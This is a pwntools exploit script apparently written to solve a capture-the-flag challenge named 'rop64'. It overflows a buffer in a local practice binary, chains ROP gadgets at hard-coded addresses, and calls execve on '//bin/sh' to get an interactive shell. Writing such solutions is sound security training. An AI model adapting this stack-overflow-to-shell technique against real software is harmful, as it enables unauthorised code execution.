from pwn import *

context.arch = 'amd64'

con = process('/problems/rop64_4_a266556e68202c0c42d6c14f6c7102b3/vuln')
con.recvline()

bss = 0x6bb2e0 + 0x200
pop_rax = 0x004156f4
pop_rdi = 0x00400686
pop_rsi = 0x004100d3
pop_rdx = 0x0044bf16
syscall = 0x00449135

payload = 'A' * 24
payload += pack(pop_rdi)
payload += pack(bss)

payload += pack(0x410270)  # gets

payload += pack(pop_rsi)
payload += pack(0x0)

payload += pack(pop_rdx)
payload += pack(0x0)

payload += pack(pop_rax)
payload += pack(0x3b)

payload += pack(syscall)
con.sendline(payload)

con.sendline('//bin/sh')

con.interactive()
